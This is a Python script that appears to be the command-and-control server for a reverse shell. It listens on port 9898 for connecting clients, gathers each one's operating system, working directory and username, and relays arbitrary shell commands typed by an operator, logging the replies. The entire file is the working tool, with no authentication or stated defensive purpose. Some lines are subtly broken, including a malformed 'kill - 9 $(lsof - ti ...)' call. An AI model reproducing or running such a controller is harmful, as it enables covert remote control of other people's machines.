import sys
import socket
import threading
import os
from datetime import datetime
import subprocess


def select_conn():
    global s, all_connections, all_address, data
    stt = "{0:^10}  {1:^10}   {2:^10}"
    live_conn = stt.format('Sr.no.', 'IP Address', 'Port\n')
    stt = "{0:^5}  {1:^5}   {2:^5}"
    for i, con in enumerate(all_connections):
        try:
            con.send(str.encode('check4live'))
            txt = str(con.recv(2048), 'utf-8')
            if len(txt) > 1:
                live_conn += stt.format(str(i + 1), str(all_address[i][0]), (str(all_address[i][1]) + '\n'))
                txt = txt.split(',')
                data[i] = txt
            else:
                all_connections.pop(i)
                all_address.pop(i)
                data.pop(i)
        except socket.error as e:
            print(e)
            print('Connection is closed...')
            s.close()
            sys.exit()
        except KeyboardInterrupt:
            print('Connection is closed...')
            s.close()
            sys.exit()

    if len(all_address) > 0:
        print(live_conn)
        c = int(input('Choose any connection: ')) - 1
        print('You are connected to IP: ' + str(all_address[c][0]) + ' Port: ' + str(all_address[c][1]))
        try:
            f.write('\n***New Connection Established***\n' + str(datetime.now()) + '------- IP: ' + str(
                all_address[c][0]) + '-------' + ' Port: ' + str(all_address[c][1]) + '\n')
            f.write(
                'Operating System: ' + data[c][0] + '\n' + 'Current WD: ' + data[c][1] + '\n' + 'Username: ' + data[c][
                    2] + '\n')
            print('Operating System: ' + data[c][0])
            print('Current WD: ' + data[c][1])
            print('Username: ' + data[c][2] + '\n')
            send_query(all_connections[c])
        except IndexError:
            print('You entered wrong serial number, please relaunch this script!!!')
            s.close()
            sys.exit()
        except KeyboardInterrupt:
            print('Connection is closed...')
            s.close()
            sys.exit()
    else:
        print('No Live Connections Found!!!')
        sys.exit()


def init_select():
    global choosed, all_connections
    while not choosed:
        print('\'select\' to list connection or \'exit\' to close script...')
        cmd = input('Enter your choice:').strip()
        if cmd == 'select':
            select_conn()
            choosed = True
        elif cmd == 'exit':
            try:
                for i in all_connections:
                    i.close()
                s.close()
            except socket.error as e:
                print(e)
                print('Connection is closed...')
                s.close()
                sys.exit()
            except KeyboardInterrupt:
                print('Connection is closed...')
                s.close()
                sys.exit()
            sys.exit()
        else:
            print('Enter valid choice....Retry:')


def create():
    global host, port, s, all_connections, all_address, f, data
    try:
        s.bind((host, port))
        s.listen(5)
        print('Binding Successful....Waiting for connections!!!')
    except socket.error as msg:
        if str(msg).find('Address already in use') != -1:
            subprocess.run('kill - 9 $(lsof - ti tcp:9898)', shell=True, capture_output=True)
            create()
        else:
            print('Error while binding connections: ' + str(msg) + '\nExiting...')
            s.close()
            sys.exit()
    flag = False
    while True:
        try:
            conn, address = s.accept()
            s.setblocking(True)
            all_connections.append(conn)
            all_address.append(address)
            data.append('test')
            if not flag:
                print('Client Connected Successfully!!!')
                init_select()
                flag = True
        except socket.error as msg:
            f.write(
                str(datetime.now()) + '-------' + ' Error while accepting connections ' + '-------' + str(msg) + '\n')
        except KeyboardInterrupt:
            print('Connection is closed...')
            s.close()
            sys.exit()


def send_query(conn):
    print('Send Your Commands.....If you want to close connection enter \'quit\'!!!')
    print('And if you want to connect with other ip enter \'list\'!!!')
    while True:
        try:
            command = input('command>>> ').strip()
            if len(command) > 0:
                if command == 'quit':
                    conn.send(str(command).encode())
                    try:
                        conn.close()
                        s.close()
                    except socket.error as e:
                        print(e)
                        print('Connection is closed...')
                        f.close()
                        conn.close()
                        s.close()
                        sys.exit()
                    except KeyboardInterrupt:
                        print('Connection is closed...')
                        f.close()
                        conn.close()
                        s.close()
                        sys.exit()
                    print('Connection is closed...')
                    sys.exit()
                if command == 'list':
                    select_conn()
                else:
                    f.write(
                        str(datetime.now()) + '-------' + ' Success/Command Executed ' + '-------' + str(command) + '\n')
                    conn.send(str(command).encode())
                    mess = str(conn.recv(1024), 'utf-8')
                    f.write(str(datetime.now()) + '-------' + ' Success/Replied ' + '-------' + str(mess) + '\n')
                    print('Reply: ' + str(mess))
            else:
                print('Invalid Command....Write something there!!!')
        except KeyboardInterrupt:
            print('Connection is closed...')
            f.close()
            conn.close()
            s.close()
            sys.exit()


if os.path.exists('log.txt'):
    f = open('log.txt', 'a')
else:
    f = open('log.txt', 'w')

host = ''
port = 9898
count = 0
data = []
choosed = False
all_connections = []
all_address = []
s = socket.socket()
try:
    s.settimeout(5)
    t1 = threading.Thread(target=create)
    t1.start()
except socket.error as e:
    print(e)
    print('Relaunch script!!!')
    s.close()
except threading.ThreadError:
    pass
except KeyboardInterrupt:
    pass

